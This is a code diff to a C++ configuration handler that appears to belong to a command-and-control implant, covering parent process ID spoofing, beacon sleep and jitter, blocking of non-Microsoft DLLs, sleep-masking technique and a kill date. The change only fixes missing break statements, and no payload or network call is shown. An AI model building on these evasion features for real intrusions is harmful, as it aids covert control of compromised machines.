@@ -1074,25 +1074,33 @@ auto DECLFN Task::Config(
                 ULONG ParentID = Self->Psr->Int32( Parser );
                 Self->Ps->Ctx.ParentID = ParentID;
 
-                KhDbg( "parent id set to %d", Self->Ps->Ctx.ParentID ); break;
+                KhDbg( "parent id set to %d", Self->Ps->Ctx.ParentID ); 
+                
+                break;
             }
             case CfgSleep: {
                 ULONG NewSleep = Self->Psr->Int32( Parser );
                 Self->Session.SleepTime = NewSleep * 1000;
 
-                KhDbg( "new sleep time set to %d ms", Self->Session.SleepTime ); break;
+                KhDbg( "new sleep time set to %d ms", Self->Session.SleepTime ); 
+                
+                break;
             }
             case CfgJitter: {
                 ULONG NewJitter = Self->Psr->Int32( Parser );
                 Self->Session.Jitter = NewJitter;
 
-                KhDbg( "new jitter set to %d", Self->Session.Jitter ); break;
+                KhDbg( "new jitter set to %d", Self->Session.Jitter ); 
+                
+                break;
             }
             case CfgBlockDlls: {
                 BOOL BlockDlls  = Self->Psr->Int32( Parser );
                 Self->Ps->Ctx.BlockDlls = BlockDlls;
                 
-                KhDbg( "block non microsoft dlls is %s", Self->Ps->Ctx.BlockDlls ? "enabled" : "disabled" ); break;
+                KhDbg( "block non microsoft dlls is %s", Self->Ps->Ctx.BlockDlls ? "enabled" : "disabled" ); 
+                
+                break;
             }
             case CfgCurDir: {
                 if ( Self->Ps->Ctx.CurrentDir ) {
@@ -1123,6 +1131,8 @@ auto DECLFN Task::Config(
                     Self->Mk->Ctx.TechniqueID == MaskTimer ? "timer" : 
                     ( Self->Mk->Ctx.TechniqueID == MaskWait  ? "wait" : "unknown" ) 
                 );
+
+                break;
             }
             case CfgSpawn: {
                 // PCHAR Spawn = Self->InjCtx.;
@@ -1133,9 +1143,8 @@ auto DECLFN Task::Config(
                 INT16 Year  = (INT16)Self->Psr->Int32( Parser );
                 INT16 Month = (INT16)Self->Psr->Int32( Parser );
                 INT16 Day   = (INT16)Self->Psr->Int32( Parser );
-            }
-            case CfgWorktime: {
 
+                break;
             }
         }
     }
